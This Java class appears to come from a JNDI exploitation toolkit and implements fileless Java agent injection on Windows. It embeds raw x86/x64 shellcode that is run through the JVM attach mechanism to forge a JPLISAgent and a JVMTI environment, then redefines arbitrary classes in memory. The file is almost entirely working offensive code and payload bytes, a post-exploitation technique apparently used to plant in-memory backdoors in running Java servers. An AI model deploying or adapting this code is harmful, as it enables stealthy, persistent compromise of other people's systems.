package com.qi4l.jndi.template.Agent;

import sun.misc.Unsafe;

import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

public class AgentNoFileForWindows {
    public static Map<String, byte[]> MAP = new HashMap<String, byte[]>();

    //	public static int pointerLength = Long.SIZE / Byte.SIZE;
    public static int pointerLength = System.getProperty("os.arch").contains("x86") ? 4 : 8;

    public static Unsafe unsafe = getUnsafe();

    public static sun.misc.Unsafe getUnsafe() {
        sun.misc.Unsafe unsafe = null;
        try {
            if (Class.forName(new Throwable().getStackTrace()[1].getClassName()).getClassLoader() == null) {
                unsafe = sun.misc.Unsafe.getUnsafe();
            }
        } catch (ClassNotFoundException ignored) {
        }

        if (unsafe == null) {
            try {
                Class                   gsonClass = Class.forName("com.google.gson.internal.reflect.UnsafeReflectionAccessor");
                java.lang.reflect.Field field     = gsonClass.getDeclaredField("theUnsafe");
                field.setAccessible(true);
                unsafe = (sun.misc.Unsafe) field.get(null);
            } catch (Exception ignored) {
            }
        }

        if (unsafe == null) {
            try {
                Class                   nettyClass = Class.forName("io.netty.util.internal.shaded.org.jctools.util.UnsafeAccess");
                java.lang.reflect.Field field      = nettyClass.getDeclaredField("UNSAFE");
                field.setAccessible(true);
                unsafe = (sun.misc.Unsafe) field.get(null);
            } catch (Exception ignored) {
            }
        }

        if (unsafe == null) {
            try {
                java.lang.reflect.Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
                theUnsafeField.setAccessible(true);
                unsafe = (sun.misc.Unsafe) theUnsafeField.get(null);
            } catch (Exception ignored) {
            }
        }

        return unsafe;
    }

    public static void redefineClasses(String className, byte[] classBody) throws Exception {
        Class cls    = Class.forName("sun.tools.attach.HotSpotVirtualMachine");
        Field field1 = cls.getDeclaredField("ALLOW_ATTACH_SELF");
        field1.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setInt(field1, field1.getModifiers() & ~Modifier.FINAL);
        field1.setBoolean(null, true);

        //伪造JPLISAgent结构时，只需要填mNormalEnvironment中的mJVMTIEnv即可，其他变量代码中实际没有使用
        long JPLISAgent = unsafe.allocateMemory(0x1000);

        byte[] buf  = new byte[]{(byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x41, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x40, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x96, (byte) 0x48, (byte) 0xAD, (byte) 0x48, (byte) 0x8B, (byte) 0x58, (byte) 0x20, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x44, (byte) 0x8B, (byte) 0x43, (byte) 0x3C, (byte) 0x4C, (byte) 0x89, (byte) 0xC2, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x44, (byte) 0x8B, (byte) 0x82, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x01, (byte) 0xD8, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x20, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x49, (byte) 0xB9, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x48, (byte) 0xFF, (byte) 0xC1, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0x8B, (byte) 0x04, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xD8, (byte) 0x4C, (byte) 0x39, (byte) 0x08, (byte) 0x75, (byte) 0xEF, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x24, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x48, (byte) 0x31, (byte) 0xF6, (byte) 0x41, (byte) 0x8B, (byte) 0x70, (byte) 0x1C, (byte) 0x48, (byte) 0x01, (byte) 0xDE, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x48, (byte) 0x01, (byte) 0xDA, (byte) 0x48, (byte) 0x89, (byte) 0xD7, (byte) 0xB9, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x48, (byte) 0x89, (byte) 0xD9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x48, (byte) 0x89, (byte) 0xC6, (byte) 0xB9, (byte) 0x6C, (byte) 0x6C, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0xB9, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0xFF, (byte) 0xD6, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x10, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0xB9, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x73, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x51, (byte) 0x48, (byte) 0xB9, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x51, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4C, (byte) 0x89, (byte) 0xF9, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x18, (byte) 0x49, (byte) 0x89, (byte) 0xC7, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x48, (byte) 0x89, (byte) 0xE1, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x89, (byte) 0xC8, (byte) 0x49, (byte) 0x83, (byte) 0xC0, (byte) 0x08, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x48, (byte) 0x8B, (byte) 0x09, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x54, (byte) 0x48, (byte) 0x89, (byte) 0xE2, (byte) 0x4D, (byte) 0x31, (byte) 0xC0, (byte) 0x4C, (byte) 0x8B, (byte) 0x39, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x20, (byte) 0x49, (byte) 0x89, (byte) 0xCE, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x48, (byte) 0xBA, (byte) 0x48, (byte) 0x47, (byte) 0x46, (byte) 0x45, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x41, (byte) 0xB8, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x30, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x20, (byte) 0x4C, (byte) 0x89, (byte) 0xF1, (byte) 0x4D, (byte) 0x8B, (byte) 0x3E, (byte) 0x4D, (byte) 0x8B, (byte) 0x7F, (byte) 0x28, (byte) 0x41, (byte) 0xFF, (byte) 0xD7, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x78, (byte) 0xC3};
        byte[] stub = new byte[]{0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41};
        if (pointerLength == 4) {
            buf = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90, (byte) 0x33, (byte) 0xC9, (byte) 0x64, (byte) 0xA1, (byte) 0x30, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8B, (byte) 0x40, (byte) 0x0C, (byte) 0x8B, (byte) 0x70, (byte) 0x14, (byte) 0xAD, (byte) 0x96, (byte) 0xAD, (byte) 0x8B, (byte) 0x58, (byte) 0x10, (byte) 0x8B, (byte) 0x53, (byte) 0x3C, (byte) 0x03, (byte) 0xD3, (byte) 0x8B, (byte) 0x52, (byte) 0x78, (byte) 0x03, (byte) 0xD3, (byte) 0x33, (byte) 0xC9, (byte) 0x8B, (byte) 0x72, (byte) 0x20, (byte) 0x03, (byte) 0xF3, (byte) 0x41, (byte) 0xAD, (byte) 0x03, (byte) 0xC3, (byte) 0x81, (byte) 0x38, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x50, (byte) 0x75, (byte) 0xF4, (byte) 0x81, (byte) 0x78, (byte) 0x04, (byte) 0x72, (byte) 0x6F, (byte) 0x63, (byte) 0x41, (byte) 0x75, (byte) 0xEB, (byte) 0x81, (byte) 0x78, (byte) 0x08, (byte) 0x64, (byte) 0x64, (byte) 0x72, (byte) 0x65, (byte) 0x75, (byte) 0xE2, (byte) 0x8B, (byte) 0x72, (byte) 0x24, (byte) 0x03, (byte) 0xF3, (byte) 0x66, (byte) 0x8B, (byte) 0x0C, (byte) 0x4E, (byte) 0x49, (byte) 0x8B, (byte) 0x72, (byte) 0x1C, (byte) 0x03, (byte) 0xF3, (byte) 0x8B, (byte) 0x14, (byte) 0x8E, (byte) 0x03, (byte) 0xD3, (byte) 0x52, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x68, (byte) 0x61, (byte) 0x72, (byte) 0x79, (byte) 0x41, (byte) 0x68, (byte) 0x4C, (byte) 0x69, (byte) 0x62, (byte) 0x72, (byte) 0x68, (byte) 0x4C, (byte) 0x6F, (byte) 0x61, (byte) 0x64, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x59, (byte) 0x50, (byte) 0x66, (byte) 0xB9, (byte) 0x33, (byte) 0x32, (byte) 0x51, (byte) 0x68, (byte) 0x6A, (byte) 0x76, (byte) 0x6D, (byte) 0x00, (byte) 0x54, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xD8, (byte) 0x83, (byte) 0xC4, (byte) 0x0C, (byte) 0x5A, (byte) 0x33, (byte) 0xC9, (byte) 0x51, (byte) 0x6A, (byte) 0x73, (byte) 0x68, (byte) 0x76, (byte) 0x61, (byte) 0x56, (byte) 0x4D, (byte) 0x68, (byte) 0x65, (byte) 0x64, (byte) 0x4A, (byte) 0x61, (byte) 0x68, (byte) 0x72, (byte) 0x65, (byte) 0x61, (byte) 0x74, (byte) 0x68, (byte) 0x47, (byte) 0x65, (byte) 0x74, (byte) 0x43, (byte) 0x68, (byte) 0x4A, (byte) 0x4E, (byte) 0x49, (byte) 0x5F, (byte) 0x54, (byte) 0x53, (byte) 0xFF, (byte) 0xD2, (byte) 0x89, (byte) 0x45, (byte) 0xF0, (byte) 0x54, (byte) 0x6A, (byte) 0x01, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x54, (byte) 0x59, (byte) 0x6A, (byte) 0x01, (byte) 0x51, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0xC1, (byte) 0x83, (byte) 0xEC, (byte) 0x30, (byte) 0x6A, (byte) 0x00, (byte) 0x54, (byte) 0x59, (byte) 0x83, (byte) 0xC1, (byte) 0x10, (byte) 0x51, (byte) 0x8B, (byte) 0x00, (byte) 0x50, (byte) 0x8B, (byte) 0x18, (byte) 0x8B, (byte) 0x43, (byte) 0x10, (byte) 0xFF, (byte) 0xD0, (byte) 0x8B, (byte) 0x43, (byte) 0x18, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x01, (byte) 0x30, (byte) 0x68, (byte) 0x44, (byte) 0x43, (byte) 0x42, (byte) 0x41, (byte) 0x83, (byte) 0xEC, (byte) 0x04, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xEC, (byte) 0x0C, (byte) 0x8B, (byte) 0x43, (byte) 0x14, (byte) 0xFF, (byte) 0xD0, (byte) 0x83, (byte) 0xC4, (byte) 0x5C, (byte) 0xC3};
            stub = new byte[]{0x44, 0x43, 0x42, 0x41};
        }
        buf = replaceBytes(buf, stub, long2ByteArray_Little_Endian(JPLISAgent + pointerLength, pointerLength));
        classBody[7] = 0x32;

        Class windowsVirtualMachine;
        System.loadLibrary("attach");
        try {
            windowsVirtualMachine = Class.forName("sun.tools.attach.WindowsVirtualMachine");
        } catch (ClassNotFoundException e) {
            byte[]      bytes       = new byte[]{-54, -2, -70, -66, 0, 0, 0, 51, 0, 21, 10, 0, 3, 0, 17, 7, 0, 18, 7, 0, 19, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 40, 76, 115, 117, 110, 47, 116, 111, 111, 108, 115, 47, 97, 116, 116, 97, 99, 104, 47, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 59, 1, 0, 7, 101, 110, 113, 117, 101, 117, 101, 1, 0, 61, 40, 74, 91, 66, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 20, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 26, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 38, 115, 117, 110, 47, 116, 111, 111, 108, 115, 47, 97, 116, 116, 97, 99, 104, 47, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 0, 33, 0, 2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 51, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 7, 0, 0, 0, 10, 0, 2, 0, 0, 0, 7, 0, 4, 0, 8, 0, 8, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 9, 0, 10, 0, 0, 1, -120, 0, 11, 0, 12, 0, 1, 0, 13, 0, 0, 0, 4, 0, 1, 0, 14, 0, 1, 0, 15, 0, 0, 0, 2, 0, 16};
            ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method      defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            windowsVirtualMachine = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        }

        Method method = windowsVirtualMachine.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
        method.setAccessible(true);
        method.invoke(null, -1, buf, "enqueue", "enqueue", null);

        long native_jvmtienv = unsafe.getLong(JPLISAgent + pointerLength);
        if (pointerLength == 4) {
            unsafe.putByte(native_jvmtienv + 201, (byte) 2);
        } else {
            unsafe.putByte(native_jvmtienv + 361, (byte) 2);
        }

        redefineClasses(className, classBody, JPLISAgent);
    }

    /**
     * long 转字节数组，小端
     */
    public static byte[] long2ByteArray_Little_Endian(long l, int length) {
        byte[] array = new byte[length];
        for (int i = 0; i < array.length; i++) {
            array[i] = (byte) (l >> (i * 8));
        }
        return array;
    }

    private static byte[] replaceBytes(byte[] bytes, byte[] byteSource, byte[] byteTarget) {
        for (int i = 0; i < bytes.length; i++) {
            boolean bl = true;//从当前下标开始的字节是否与欲替换字节相等;
            for (int j = 0; j < byteSource.length; j++) {
                if (i + j < bytes.length && bytes[i + j] == byteSource[j]) {
                } else {
                    bl = false;
                }
            }
            if (bl) {
                System.arraycopy(byteTarget, 0, bytes, i, byteTarget.length);
            }
        }
        return bytes;
    }

    public static void redefineClasses(String className, byte[] classBody, long JPLISAgent) {
        try {
            Class<?>       instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
            Constructor<?> constructor      = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
            constructor.setAccessible(true);
            Object inst = constructor.newInstance(JPLISAgent, true, false);

            ClassDefinition definition    = new ClassDefinition(Class.forName(className), classBody);
            Method          redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
            redefineClazz.invoke(inst, new Object[]{new ClassDefinition[]{definition}});
        } catch (Throwable error) {
            error.printStackTrace();
        }
    }
}
